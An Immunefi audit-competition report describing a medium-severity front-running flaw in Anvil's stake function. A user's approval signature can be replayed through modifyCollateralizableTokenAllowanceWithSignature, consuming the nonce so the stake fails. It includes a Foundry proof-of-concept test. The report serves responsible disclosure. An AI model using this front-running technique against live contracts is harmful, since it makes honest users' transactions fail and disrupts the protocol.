# #36268 \[SC-Medium] stake with signature can be front-run lead to user's stake failed

**Submitted on Oct 27th 2024 at 05:37:13 UTC by @coffiasd for** [**Audit Comp | Anvil**](https://immunefi.com/audit-competition/audit-comp-anvil)

* **Report ID:** #36268
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://etherscan.io/address/0xd042C267758eDDf34B481E1F539d637e41db3e5a>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

User stake assets to pool by invoke stake along with signed signature , this action can be front-run lead to user's stake failed

## Vulnerability Details

The signature can be used to invoke CollateralVault::modifyCollateralizableTokenAllowanceWithSignature directly to change the allowcance of specifc ERC20 token.Due to the Nonce auto increased , user's transaction will result in failed.

## Impact Details

User have to make another transaction , if this ERC20 token's approve state changed, user is unable to stake again.

## References

\`\`\`solidity function stake( IERC20 \_token, uint256 \_amount, bytes calldata \_collateralizableApprovalSignature ) external withEligibleAccountTokensReleased(msg.sender, address(\_token)) returns (uint256) { if (\_collateralizableApprovalSignature.length > 0) { collateral.modifyCollateralizableTokenAllowanceWithSignature( msg.sender, address(this), address(\_token), Pricing.safeCastToInt256(\_amount), \_collateralizableApprovalSignature ); }

```
    return _stake(_token, _amount);
}
```

\`\`\`

\`\`\`solidity function modifyCollateralizableTokenAllowanceWithSignature( address \_accountAddress, address \_collateralizableContractAddress, address \_tokenAddress, int256 \_allowanceAdjustment, bytes calldata \_signature ) external { if (\_allowanceAdjustment > 0 && !collateralizableContracts\[\_collateralizableContractAddress]) revert ContractNotApprovedByProtocol(\_collateralizableContractAddress);

```
    _modifyCollateralizableTokenAllowanceWithSignature(
        _accountAddress,
        _collateralizableContractAddress,
        _tokenAddress,
        _allowanceAdjustment,
        _signature
    ); //@audit this can be front-run and break the func.
}
```

\`\`\`

## Link to Proof of Concept

<https://gist.github.com/coffiasd/815078ec565993e6e74874f944629706>

## Proof of Concept

## Proof of Concept

\`\`\`solidity function testUserStakeFromPool() public { uint256 privateKey = 123; address alice = vm.addr(privateKey); MockERC20 token = MockERC20Tokens\[0]; uint256 amount = 1e18; deal(address(token),alice,amount);

```
    uint256[] memory amounts &#x3D; new uint256[](1);
    address[] memory tokens &#x3D; new address[](1);
    amounts[0] &#x3D; amount;
    tokens[0] &#x3D; address(token);

    //depositAndApprove.
    vm.startPrank(alice);
    token.approve(address(colla), amount);
    colla.depositAndApprove(tokens, amounts, address(pool));
    vm.stopPrank();

    bytes32 hash &#x3D; bytes32(0x082cb21d17680735512c9f8fae9ea433c5d7e18b2a4d9a2f0adadbf56761c4d6);

    (uint8 v, bytes32 r, bytes32 s) &#x3D; vm.sign(privateKey, hash);
    bytes memory signature &#x3D; abi.encodePacked(r, s, v);

    colla.modifyCollateralizableTokenAllowanceWithSignature(alice,address(pool),address(token),1e18,signature);

    vm.prank(alice);
    pool.stake(IERC20(address(token)),1e18,signature);
}
```

\`\`\`
